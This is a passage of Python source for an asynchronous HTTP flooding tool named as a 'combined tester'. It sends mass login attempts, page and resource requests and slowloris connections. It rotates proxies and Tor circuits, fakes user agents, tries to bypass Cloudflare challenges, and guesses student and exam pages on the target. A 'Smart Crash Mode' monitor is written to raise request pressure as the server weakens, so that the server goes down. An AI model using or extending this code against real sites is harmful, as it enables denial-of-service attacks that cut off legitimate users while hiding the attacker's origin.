            else:
                resolved[k] = v
        return resolved

    async def execute_step(self, session, step: Dict) -> Tuple[bool, Optional[str], float]:
        base_url = self.script.get('base_url', '')
        action = step.get('action', 'get').lower()
        path = self._resolve_vars(step.get('path', '/'))
        url = urljoin(base_url, path)
        t = time.time()
        try:
            if action == 'get':
                headers = {'User-Agent': random_ua(), 'Accept': '*/*', 'Connection': 'keep-alive'}
                async with session.get(url, headers=headers, ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    if 'extract' in step:
                        for var_name, field_name in step['extract'].items():
                            match = re.search(fr'name=["\']?{re.escape(field_name)}["\']?[^>]*value=["\']?([^>"\'\s]+)', body)
                            if match:
                                self.variables[var_name] = match.group(1)
                    expect = step.get('expect', [])
                    if expect and resp.status not in expect:
                        return False, f"Expected {expect}, got {resp.status}", elapsed
                    return True, f"GET {resp.status}", elapsed
            elif action == 'post':
                data = self._resolve_dict(step.get('data', {}))
                headers = {
                    'User-Agent': random_ua(),
                    'Content-Type': step.get('content_type', 'application/x-www-form-urlencoded'),
                    'Referer': url, 'Origin': base_url, 'Connection': 'keep-alive',
                }
                async with session.post(url, headers=headers, data=data,
                                        ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    expect = step.get('expect', [])
                    if expect and resp.status not in expect:
                        return False, f"Expected {expect}, got {resp.status}", elapsed
                    return True, f"POST {resp.status}", elapsed
            elif action == 'sleep':
                ms = step.get('ms', 100)
                await asyncio.sleep(ms / 1000)
                return True, f"Sleep {ms}ms", 0
            elif action == 'slowloris':
                headers = {'User-Agent': random_ua(), 'Connection': 'keep-alive'}
                try:
                    async with session.get(url, headers=headers, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=30),
                                           allow_redirects=False) as resp:
                        await asyncio.sleep(random.uniform(5, 15))
                        elapsed = time.time() - t
                        return True, f"Slowloris {elapsed:.1f}s", elapsed
                except asyncio.TimeoutError:
                    elapsed = time.time() - t
                    return True, f"Slowloris timeout {elapsed:.1f}s", elapsed
        except Exception as e:
            elapsed = time.time() - t
            return False, type(e).__name__, elapsed
        return False, "Unknown action", 0

    async def run_loop(self, session, stats_callback=None):
        steps = self.script.get('steps', [])
        loop = self.script.get('loop', True)
        delay_ms = self.script.get('delay_ms', 10)
        stop_event = asyncio.Event()
        while not stop_event.is_set():
            for step in steps:
                ok, hint, rt = await self.execute_step(session, step)
                if stats_callback:
                    stats_callback(ok, hint, rt, 'script')
                await asyncio.sleep(delay_ms / 1000)
            if not loop:
                break


# ═══════════════════════════════════════════════════════════════════════════════
# Proxy & Tor
# ═══════════════════════════════════════════════════════════════════════════════

class ProxyManager:
    """Proxy list management and rotation"""

    def __init__(self, proxy_file: Optional[str] = None, tor_enabled: bool = False):
        self.proxies: List[str] = []
        self.tor_enabled = tor_enabled
        self.tor_port = 9050
        self.tor_control_port = 9051
        self.current_index = 0

        if proxy_file:
            self._load_proxy_file(proxy_file)

        if tor_enabled:
            self.proxies.insert(0, f'socks5://127.0.0.1:{self.tor_port}')
            print(f"  {C.CY}[TOR] Tor enabled (SOCKS5://127.0.0.1:{self.tor_port}){C.RS}")

        if self.proxies:
            print(f"  {C.G}[PROXY] {len(self.proxies)} proxies loaded{C.RS}")

    def _load_proxy_file(self, filepath: str):
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '://' not in line:
                        line = f'http://{line}'
                    self.proxies.append(line)
        except FileNotFoundError:
            print(f"  {C.R}[ERROR] Proxy file not found: {filepath}{C.RS}")

    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return proxy

    def get_random_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    async def renew_tor_circuit(self):
        if not self.tor_enabled:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(('127.0.0.1', self.tor_control_port))
            sock.send(b'AUTHENTICATE ""\r\n')
            resp = sock.recv(1024)
            if b'250' in resp:
                sock.send(b'SIGNAL NEWNYM\r\n')
                resp = sock.recv(1024)
                if b'250' in resp:
                    print(f"  {C.G}[TOR] New circuit! IP changed{C.RS}")
                    await asyncio.sleep(3)
                    sock.close()
                    return True
            sock.close()
        except Exception:
            pass
        return False

    def create_connector(self, proxy: Optional[str] = None) -> Optional[Any]:
        proxy_url = proxy or self.get_random_proxy()
        if not proxy_url:
            return None
        if proxy_url.startswith('socks'):
            if HAS_AIOHTTP_SOCKS:
                proxy_type_str = proxy_url.split('://')[0]
                parsed = urlparse(proxy_url)
                proxy_type = ProxyType.SOCKS5 if 'socks5' in proxy_type_str else ProxyType.SOCKS4
                return ProxyConnector(
                    proxy_type=proxy_type,
                    host=parsed.hostname,
                    port=parsed.port or 1080,
                )
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# Form field extraction and link discovery (from v2)
# ═══════════════════════════════════════════════════════════════════════════════

def extract_form_fields(html: str) -> Dict[str, str]:
    fields = {}
    hidden_inputs = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', html, re.IGNORECASE)
    for inp in hidden_inputs:
        name_match = re.search(r'name=(["\']?)([^>"\'\s]+)\1', inp)
        value_match = re.search(r'value=(["\']?)([^>"\']*)\1', inp)
        if name_match:
            fields[name_match.group(2)] = value_match.group(2) if value_match else ""
    asp_inputs = re.findall(r'<input[^>]*name=(["\']?)(__[^>"\'\s]+)\1[^>]*value=(["\']?)([^>"\']*)\3[^>]*>', html)
    asp_inputs_rev = re.findall(r'<input[^>]*value=(["\']?)([^>"\']*)\1[^>]*name=(["\']?)(__[^>"\'\s]+)\3[^>]*>', html)
    for m in asp_inputs:
        name, value = m[1], m[3]
        if name not in fields: fields[name] = value
    for m in asp_inputs_rev:
        value, name = m[1], m[3]
        if name not in fields: fields[name] = value
    return fields


def detect_login_fields(html: str) -> Tuple[str, str, str]:
    username_field = "username"
    password_field = "password"
    login_button = ""
    patterns_user = [
        r'name=(["\']?)ctl00[^>"\']*[Uu]ser[^>"\']*\1', r'name=(["\']?)txtUserName\1',
        r'name=(["\']?)txtUsername\1', r'name=(["\']?)txtUser\1',
        r'name=(["\']?)UserName\1', r'name=(["\']?)username\1',
        r'name=(["\']?)email\1', r'name=(["\']?)txtEmail\1',
    ]
    patterns_pass = [
        r'name=(["\']?)ctl00[^>"\']*[Pp]ass[^>"\']*\1', r'name=(["\']?)txtPassword\1',
        r'name=(["\']?)txtPass\1', r'name=(["\']?)Password\1',
        r'name=(["\']?)password\1', r'name=(["\']?)txtPwd\1',
    ]
    patterns_btn = [
        r'name=(["\']?)ctl00[^>"\']*[Bb]tn[^>"\']*[Ll]ogin[^>"\']*\1',
        r'name=(["\']?)ctl00[^>"\']*[Bb]tn[^>"\']*\1',
        r'name=(["\']?)btnLogin\1', r'name=(["\']?)Button1\1',
        r'name=(["\']?)btnSubmit\1', r'name=(["\']?)Submit\1',
    ]
    for p in patterns_user:
        m = re.search(p, html)
        if m:
            nm = re.search(r'name=(["\']?)([^>"\'\s]+)\1', m.group(0))
            if nm: username_field = nm.group(2)
            break
    for p in patterns_pass:
        m = re.search(p, html)
        if m:
            nm = re.search(r'name=(["\']?)([^>"\'\s]+)\1', m.group(0))
            if nm: password_field = nm.group(2)
            break
    for p in patterns_btn:
        m = re.search(p, html)
        if m:
            nm = re.search(r'name=(["\']?)([^>"\'\s]+)\1', m.group(0))
            if nm: login_button = nm.group(2)
            break
    return username_field, password_field, login_button


def extract_links(html: str, base_url: str) -> Set[str]:
    links = set()
    parsed_base = urlparse(base_url)
    domain = parsed_base.netloc
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.IGNORECASE):
        link = m.group(1)
        if link.startswith(('javascript:', 'mailto:', 'tel:', '#', 'data:')): continue
        if link.startswith('/'):
            link = f"{parsed_base.scheme}://{domain}{link}"
        elif not link.startswith('http'):
            link = urljoin(base_url, link)
        link_parsed = urlparse(link)
        if link_parsed.netloc == domain:
            links.add(link.split('#')[0])
    for m in re.finditer(r'src=["\']([^"\']+)["\']', html, re.IGNORECASE):
        link = m.group(1)
        if link.startswith(('javascript:', 'data:', '#')): continue
        if link.startswith('/'):
            link = f"{parsed_base.scheme}://{domain}{link}"
        elif not link.startswith('http'):
            link = urljoin(base_url, link)
        link_parsed = urlparse(link)
        if link_parsed.netloc == domain:
            links.add(link.split('#')[0])
    return links


# ═══════════════════════════════════════════════════════════════════════════════
# Data Classes
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class HitResult:
    ok: bool
    code: Optional[int]
    rt: float
    mode: str = ""
    err: Optional[str] = None
    hint: str = ""
    ts: float = field(default_factory=time.time)
    url: str = ""

@dataclass
class Stats:
    total: int = 0
    ok: int = 0
    fail: int = 0
    rate_limited: int = 0
    captcha: int = 0
    locked: int = 0
    login_ok: int = 0
    login_fail: int = 0
    page_hits: int = 0
    resource_hits: int = 0
    slowloris_hits: int = 0
    script_hits: int = 0
    cf_solved: int = 0
    rts: deque = field(default_factory=lambda: deque(maxlen=50000))
    codes: Dict[int, int] = field(default_factory=dict)
    hints: Dict[str, int] = field(default_factory=dict)
    errs: deque = field(default_factory=lambda: deque(maxlen=1000))
    t0: float = 0
    t1: float = 0
    users: int = 0
    _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
    first_rl_at: int = 0
    first_cap_at: int = 0
    first_lock_at: int = 0

    @property
    def dur(self):
        return (self.t1 if self.t1 > self.t0 else time.time()) - self.t0 if self.t0 else 0
    @property
    def rps(self):
        return self.total / self.dur if self.dur > 0 else 0
    @property
    def rrps(self):
        now = time.time()
        r = [x for x in self._recent if now - x.ts < 5]
        return len(r) / 5 if r else 0
    @property
    def art(self):
        return statistics.mean(self.rts) if self.rts else 0
    @property
    def rart(self):
        now = time.time()
        r = [x.rt for x in self._recent if now - x.ts < 5]
        return statistics.mean(r) if r else 0


# ═══════════════════════════════════════════════════════════════════════════════
# Smart Crash Mode — Server Health Monitor
# ═══════════════════════════════════════════════════════════════════════════════

class ServerHealthMonitor:
    """
    Monitors server health indicators to detect when the server is going down.

    Instead of backing off when errors increase (like the old Lock-On algorithm),
    this monitors whether the server is STRUGGLING and gradually increases pressure.

    Logic:
    - Track response times, error rates, and timeout patterns over rolling windows
    - Calculate a "server health score" (0.0 = dead, 1.0 = healthy)
    - When health drops below thresholds:
      * health < 0.6: Server is struggling -> INCREASE pressure slightly (it's working!)
      * health < 0.3: Server is failing hard -> INCREASE pressure more aggressively
      * health < 0.1: Server is nearly dead -> Maximum pressure
    - When health is high (> 0.7): Scale up normally
    """

    def __init__(self):
        # Rolling windows for health calculation
        self._rt_window: deque = deque(maxlen=200)      # Response times
        self._status_window: deque = deque(maxlen=200)   # (status, ok) tuples
        self._timeout_streak: int = 0                     # Consecutive timeouts
        self._health_history: deque = deque(maxlen=20)    # Health scores
        self._pressure_multiplier: float = 1.0            # Pressure multiplier
        self.crash_mode_active: bool = False
        self.server_dying: bool = False
        self._baseline_rt: float = 0                      # Initial response time baseline
        self._baseline_set: bool = False

    def record(self, result: HitResult):
        """Record a result for health monitoring"""
        self._rt_window.append(result.rt)
        self._status_window.append((result.code, result.ok))

        # Track timeout streaks
        if result.err and 'Timeout' in (result.err or ''):
            self._timeout_streak += 1
        elif result.err and 'Connect' in (result.err or ''):
            self._timeout_streak += 1
        else:
            self._timeout_streak = max(0, self._timeout_streak - 1)

        # Set baseline from first few successful requests
        if not self._baseline_set and result.ok and result.rt > 0:
            self._baseline_rt = result.rt
            self._baseline_set = True

    def calculate_health(self) -> float:
        """
        Calculate server health score (0.0 to 1.0)

        Components:
        - Error rate (40%): Ratio of failed requests
        - Response time degradation (30%): How much slower than baseline
        - Timeout streak (20%): Consecutive connection failures
        - 5xx rate (10%): Server errors specifically
        """
        if len(self._status_window) < 5:
            return 1.0  # Not enough data yet

        # Error rate component
        fails = sum(1 for _, ok in self._status_window if not ok)
        error_rate = fails / len(self._status_window)
        error_score = max(0, 1.0 - error_rate * 2)  # 50% errors = 0 score

        # Response time degradation component
        if self._rt_window and self._baseline_rt > 0:
            avg_rt = statistics.mean(list(self._rt_window)[-50:])
            rt_ratio = avg_rt / max(self._baseline_rt, 0.01)
            # If response time is 3x baseline, score = 0
            rt_score = max(0, 1.0 - (rt_ratio - 1.0) / 2.0)
        else:
            rt_score = 1.0

        # Timeout streak component
        # 5+ consecutive timeouts = very bad
        timeout_score = max(0, 1.0 - self._timeout_streak / 10.0)

        # 5xx rate component
        server_errors = sum(1 for code, _ in self._status_window
                          if code is not None and code >= 500)
        server_error_rate = server_errors / len(self._status_window)
        server_error_score = max(0, 1.0 - server_error_rate * 3)

        # Weighted combination
        health = (error_score * 0.4 + rt_score * 0.3 +
                  timeout_score * 0.2 + server_error_score * 0.1)

        self._health_history.append(health)
        return health

    def get_pressure_advice(self, current_workers: int, max_workers: int,
                           step: int) -> Tuple[str, int]:
        """
        Decide how many workers to add/remove based on server health.

        Returns: (mode, worker_delta)
          mode: "NORMAL" | "PRESSURE" | "CRASH" | "MAXIMUM"
          worker_delta: positive = add workers, negative = remove
        """
        health = self.calculate_health()
        avg_health = (statistics.mean(self._health_history)
                     if self._health_history else 1.0)

        # Check if server is dying (multiple indicators)
        timeout_rate = self._timeout_streak / max(len(self._status_window), 1)
        recent_health = self._health_history[-1] if self._health_history else 1.0
        self.server_dying = (recent_health < 0.3 and self._timeout_streak > 3) or \
                           (recent_health < 0.15 and len(self._status_window) > 20)

        if health < 0.15 or (self._timeout_streak > 8 and avg_health < 0.2):
            # Server is nearly dead -> MAXIMUM PRESSURE
            self.crash_mode_active = True
            delta = min(step * 3, max_workers - current_workers)
            self._pressure_multiplier = min(self._pressure_multiplier * 1.2, 4.0)
            return "MAXIMUM", delta

        elif health < 0.3:
            # Server is failing hard -> AGGRESSIVE increase
            self.crash_mode_active = True
            delta = min(int(step * 1.5), max_workers - current_workers)
            self._pressure_multiplier = min(self._pressure_multiplier * 1.1, 3.0)
            return "CRASH", delta

        elif health < 0.5:
            # Server is struggling -> Moderate increase (it's working!)
            self.crash_mode_active = True
            delta = min(step, max_workers - current_workers)
            return "PRESSURE", delta

        elif health < 0.65:
            # Server is degrading -> Cautious increase
            self.crash_mode_active = False
            delta = min(int(step * 0.5), max_workers - current_workers)
            return "PRESSURE", delta

        else:
            # Server is healthy -> Normal scaling
            self.crash_mode_active = False
            self._pressure_multiplier = max(self._pressure_multiplier * 0.95, 1.0)
            delta = min(step, max_workers - current_workers)
            return "NORMAL", delta

    @property
    def health_score(self) -> float:
        return self._health_history[-1] if self._health_history else 1.0

    @property
    def trend(self) -> str:
        """Health trend: improving, stable, or degrading"""
        if len(self._health_history) < 5:
            return "unknown"
        recent = list(self._health_history)[-5:]
        older = list(self._health_history)[-10:-5] if len(self._health_history) >= 10 else recent
        recent_avg = statistics.mean(recent)
        older_avg = statistics.mean(older)
        diff = recent_avg - older_avg
        if diff > 0.05:
            return "improving"
        elif diff < -0.05:
            return "degrading"
        return "stable"


# ═══════════════════════════════════════════════════════════════════════════════
# Main Engine — v4
# ═══════════════════════════════════════════════════════════════════════════════

class CombinedTester:
    def __init__(self, login_url: str, timeout: int = 20, safe_max: int = 3000,
                 enable_slowloris: bool = False, enable_cfb: bool = False,
                 enable_http2: bool = False, tor_enabled: bool = False,
                 proxy_file: Optional[str] = None, script_path: Optional[str] = None):
        self.login_url = login_url
        parsed = urlparse(login_url)
        self.site_root = f"{parsed.scheme}://{parsed.netloc}"
        self.base_url = parsed.scheme + "://" + parsed.netloc + parsed.path.rsplit('/', 1)[0]
        self.target_host = parsed.hostname
        self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)

        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.stats = Stats()
        self._stop = asyncio.Event()
        self._snaps: List[dict] = []
        self.safe_max = safe_max

        self.username_field = "username"
        self.password_field = "password"
        self.login_button = ""
        self.detected = False
        self.discovered_pages: List[str] = []
        self.discovered_resources: List[str] = []
        self.guessed_pages: List[str] = []
        self._viewstate_cache: Dict[str, str] = {}
        self._viewstate_ts: float = 0
        self._viewstate_ttl: float = 30.0
        self.page_weights: Dict[str, float] = {}
        self.resource_weights: Dict[str, float] = {}
        self.peak_workers = 0
        self.ceiling_workers = 0
        self.limit_hit = False
        self.detected_waf: Optional[str] = None

        # v3 features
        self.enable_slowloris = enable_slowloris
        self.enable_cfb = enable_cfb
        self.enable_http2 = enable_http2 and HAS_HTTPX
        self.cf_bypass = CloudflareBypass() if enable_cfb else None
        self.proxy_manager = ProxyManager(proxy_file, tor_enabled) if (proxy_file or tor_enabled) else None
        self.script_engine = ScriptEngine(script_path) if script_path else None

        # v4 features
        self.health_monitor = ServerHealthMonitor()
        self.live_log = LiveLog(max_lines=8)
        self.keyboard = KeyboardHandler()
        self._manual_delta: int = 0  # Manual worker adjustment from keyboard

        if tor_enabled:
            self._check_tor()

    def _check_tor(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(('127.0.0.1', 9050))
            sock.close()
            print(f"  {C.G}[TOR] Connection established{C.RS}")
        except Exception:
            print(f"  {C.Y}[WARN] Tor not reachable on port 9050!{C.RS}")
            print(f"     Make sure Tor Browser or tor daemon is running")

    def stop(self):
        self._stop.set()

    def _base_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Connection": "keep-alive",
        }

    async def _fetch_page(self, session, url=None):
        headers = self._base_headers()
        try:
            async with session.get(url or self.login_url, headers=headers, ssl=False, allow_redirects=True) as resp:
                return await resp.text()
        except Exception:
            return None

    async def _detect_waf(self, session):
        headers = self._base_headers()
        try:
            async with session.get(self.site_root, headers=headers, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as resp:
                server = resp.headers.get('Server', '').lower()
                cf_ray = resp.headers.get('CF-Ray', '')
                if cf_ray:
                    self.detected_waf = "cloudflare"
                    print(f"  {C.R}[WAF] Cloudflare detected!{C.RS}")
                elif 'arvan' in server:
                    self.detected_waf = "arvan"
                    print(f"  {C.R}[WAF] ArvanCloud detected!{C.RS}")
                elif 'iis' in server:
                    self.detected_waf = "iis"
                elif 'nginx' in server:
                    self.detected_waf = "nginx"
        except Exception:
            pass

    async def _detect_and_discover(self, session):
        print(f"\n  {C.CY}[SCAN] Analyzing and discovering site...{C.RS}")
        await self._detect_waf(session)

        html = await self._fetch_page(session)
        if not html:
            print(f"  {C.R}[ERROR] Failed to fetch page{C.RS}")
            return False

        # CFB check
        if self.cf_bypass:
            try:
                async with session.get(self.login_url, headers=self._base_headers(), ssl=False,
                                       allow_redirects=True) as resp:
                    body = await resp.text()
                    if self.cf_bypass.is_cf_challenge(resp.status, body, dict(resp.headers)):
                        print(f"  {C.Y}[CFB] Cloudflare Challenge detected! Solving...{C.RS}")
                        cookies = await self.cf_bypass.solve_challenge(session, self.login_url, body, dict(resp.headers))
                        if cookies:
                            print(f"  {C.G}[CFB] Cloudflare Bypass successful!{C.RS}")
                            self.stats.cf_solved += 1
                            html = await self._fetch_page(session)
                        else:
                            print(f"  {C.R}[CFB] Cloudflare Bypass failed!{C.RS}")
            except Exception:
                pass

        if not html:
            return False

        self.username_field, self.password_field, self.login_button = detect_login_fields(html)
        asp_fields = extract_form_fields(html)
        self._viewstate_cache = asp_fields
        self._viewstate_ts = time.time()

        print(f"  {C.G}[OK] Login page ({len(html):,}B){C.RS}")
        print(f"  [FORM] User:     {C.BD}{self.username_field}{C.RS}")
        print(f"  [FORM] Pass:     {C.BD}{self.password_field}{C.RS}")
        if self.login_button:
            print(f"  [FORM] Button:   {C.BD}{self.login_button}{C.RS}")

        links = extract_links(html, self.site_root)
        for link in links:
            ext = link.rsplit('.', 1)[-1].lower() if '.' in link.split('?')[0].rsplit('/', 1)[-1] else ''
            if ext in ('jpg','jpeg','png','gif','svg','ico','webp','bmp','css','js','woff','woff2','ttf','eot','pdf','zip'):
                self.discovered_resources.append(link)
            elif ext in ('aspx','html','htm','php','') or '?' in link:
                self.discovered_pages.append(link)

        common_pages = [
            "/Default.aspx","/FirstPages/Student.aspx","/FirstPages/Teacher.aspx",
            "/FirstPages/Admin.aspx","/FirstPages/Default.aspx","/FirstPages/Home.aspx",
            "/Admin/Default.aspx","/Admin/Login.aspx","/api/","/handler.ashx",
            "/WebService.asmx","/FirstPages/StudentRegister.aspx",
            "/FirstPages/ExamResult.aspx","/api/students","/api/exams",
        ]
        for page in common_pages:
            full_url = self.site_root + page
            if full_url not in self.discovered_pages:
                self.guessed_pages.append(full_url)

        common_resources = [
            "/Content/Images/logo.png","/Scripts/jquery.js","/Content/Site.css",
            "/favicon.ico","/Scripts/bootstrap.js","/Content/bootstrap.css",
        ]
        for res in common_resources:
            full_url = self.site_root + res
            if full_url not in self.discovered_resources:
                self.discovered_resources.append(full_url)

        print(f"  [SCAN] Pages: {len(self.discovered_pages)} discovered + {len(self.guessed_pages)} guessed")
        print(f"  [SCAN] Resources: {len(self.discovered_resources)}")
        self.detected = True
        return True

    async def _refresh_viewstate(self, session):
        now = time.time()
        if now - self._viewstate_ts > self._viewstate_ttl or not self._viewstate_cache:
            try:
                async with session.get(self.login_url, headers=self._base_headers(), ssl=False, allow_redirects=True) as resp:
                    html = await resp.text()
                    self._viewstate_cache = extract_form_fields(html)
                    self._viewstate_ts = now
            except Exception:
                pass
        return dict(self._viewstate_cache)

    def _select_weighted_page(self, pages):
        if not self.page_weights or not pages:
            return random.choice(pages) if pages else self.login_url
        weights = [max(self.page_weights.get(p, 1.0), 0.1) for p in pages]
        try:
            return random.choices(pages, weights=weights, k=1)[0]
        except Exception:
            return random.choice(pages)

    async def _send_login(self, session):
        t = time.time()
        try:
            hidden_fields = await self._refresh_viewstate(session)
            form_data = {**hidden_fields, self.username_field: rand_user(), self.password_field: rand_pass()}
            if self.login_button:
                form_data[self.login_button] = "Login"
            headers = {**self._base_headers(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.site_root, "Referer": self.login_url,
            }
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.post(self.login_url, headers=headers, data=form_data,
                                    ssl=False, allow_redirects=False, proxy=proxy) as resp:
                body = await resp.text()
                elapsed = time.time() - t

                if self.cf_bypass and self.cf_bypass.is_cf_challenge(resp.status, body, dict(resp.headers)):
                    cookies = await self.cf_bypass.solve_challenge(session, self.login_url, body, dict(resp.headers))
                    self.stats.cf_solved += (1 if cookies else 0)

                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                   mode="login", hint=self._analyze_response(resp.status, body), url=self.login_url)
                await self.live_log.add("login", resp.status, elapsed, result.err, self.login_url, result.hint)
                self.health_monitor.record(result)
                return result
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
            await self.live_log.add("login", None, result.rt, "Timeout", self.login_url)
            self.health_monitor.record(result)
            return result
        except aiohttp.ClientError as e:
            msg = str(e)
            if "Connection" in msg: msg = "ConnErr"
            elif "Cannot connect" in msg: msg = "NoConnect"
            elif "Buffer" in msg: msg = "BufFull"
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
            await self.live_log.add("login", None, result.rt, msg, self.login_url)
            self.health_monitor.record(result)
            return result
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=type(e).__name__)
            await self.live_log.add("login", None, result.rt, type(e).__name__, self.login_url)
            self.health_monitor.record(result)
            return result

    async def _hit_page(self, session, url):
        t = time.time()
        try:
            sep = '&' if '?' in url else '?'
            busted = f"{url}{sep}{rand_cache_bust()}"
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.get(busted, headers=self._base_headers(), ssl=False,
                                   allow_redirects=True, proxy=proxy) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                size_kb = len(body) / 1024
                self.page_weights[url] = (self.page_weights.get(url, 1.0) * 0.7) + ((elapsed * 2 + size_kb / 100) * 0.3)
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                   mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
                await self.live_log.add("page", resp.status, elapsed, result.err, url, result.hint)
                self.health_monitor.record(result)
                return result
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
            await self.live_log.add("page", None, result.rt, "Timeout", url)
            self.health_monitor.record(result)
            return result
        except Exception as e:
            msg = type(e).__name__
            if "Buffer" in str(e): msg = "BufFull"
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=msg, url=url)
            await self.live_log.add("page", None, result.rt, msg, url)
            self.health_monitor.record(result)
            return result

    async def _hit_resource(self, session, url):
        t = time.time()
        try:
            headers = {"User-Agent": random_ua(), "Accept": "*/*", "Cache-Control": "no-cache", "Connection": "keep-alive"}
            sep = '&' if '?' in url else '?'
            busted = f"{url}{sep}{rand_cache_bust()}"
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.get(busted, headers=headers, ssl=False, allow_redirects=True, proxy=proxy) as resp:
                data = await resp.read()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                   mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
                await self.live_log.add("resource", resp.status, elapsed, result.err, url, result.hint)
                self.health_monitor.record(result)
                return result
        except Exception as e:
            msg = type(e).__name__
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=msg, url=url)
            await self.live_log.add("resource", None, result.rt, msg, url)
            self.health_monitor.record(result)
            return result

    async def _slowloris(self, session):
        t = time.time()
        try:
            headers = self._base_headers()
            headers["Content-Length"] = str(random.randint(10000, 100000))
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.get(self.login_url, headers=headers, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=30), allow_redirects=False, proxy=proxy) as resp:
                await asyncio.sleep(random.uniform(5, 15))
                elapsed = time.time() - t
                result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
                                   hint=f"Slowloris {elapsed:.1f}s", url=self.login_url)
                await self.live_log.add("slowloris", resp.status, elapsed, None, self.login_url, result.hint)
                return result
        except asyncio.TimeoutError:
            elapsed = time.time() - t
            result = HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
                               hint=f"Slowloris timeout {elapsed:.1f}s", url=self.login_url)
            await self.live_log.add("slowloris", None, elapsed, None, self.login_url, "timeout")
            return result
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
            await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.login_url)
            return result

    def _analyze_response(self, status, body):
        body_lower = body.lower() if body else ''
        if status == 429: return "429 Rate Limited"
        elif status == 503: return "503 Unavailable"
        elif any(x in body_lower for x in ["rate limit", "too many"]): return "Rate limit"
        elif any(x in body_lower for x in ["captcha", "recaptcha"]): return "CAPTCHA"
        elif any(x in body_lower for x in ["locked", "too many attempts"]): return "Account locked"
        elif any(x in body_lower for x in ["welcome", "dashboard"]): return "Login success!"
        elif status in (301, 302, 303, 307): return "Redirect"
        elif any(x in body_lower for x in ["invalid", "wrong"]): return "Invalid credentials"
        return f"Status {status}"

    def _record(self, r):
        self.stats.total += 1
        self.stats.rts.append(r.rt)
        self.stats._recent.append(r)
        if r.ok: self.stats.ok += 1
        else:
            self.stats.fail += 1
            if r.err: self.stats.errs.append(r.err)
        if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
        if r.hint: self.stats.hints[r.hint] = self.stats.hints.get(r.hint, 0) + 1
        if r.mode == "login":
            h = r.hint.lower()
            if "rate limit" in h or "429" in h or "503" in h:
                self.stats.rate_limited += 1
                if not self.stats.first_rl_at: self.stats.first_rl_at = self.stats.total
            elif "captcha" in h: self.stats.captcha += 1
            elif "locked" in h: self.stats.locked += 1
            elif "success" in h or "redirect" in h: self.stats.login_ok += 1
            else: self.stats.login_fail += 1
        elif r.mode == "page": self.stats.page_hits += 1
        elif r.mode == "resource": self.stats.resource_hits += 1
        elif r.mode == "slowloris": self.stats.slowloris_hits += 1
        elif r.mode == "script": self.stats.script_hits += 1

    def _get_target_urls(self):
        pages = list(self.discovered_pages) + list(self.guessed_pages)
        if not pages: pages = [self.site_root + "/Default.aspx", self.login_url]
        resources = list(self.discovered_resources)
        if not resources: resources = [self.site_root + "/favicon.ico"]
        return pages, resources

    async def _worker_login(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            result = await self._send_login(session)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(0.01)

    async def _worker_page(self, session, pages, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            url = self._select_weighted_page(pages)
            result = await self._hit_page(session, url)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(0.01)

    async def _worker_resource(self, session, resources, delay=0):
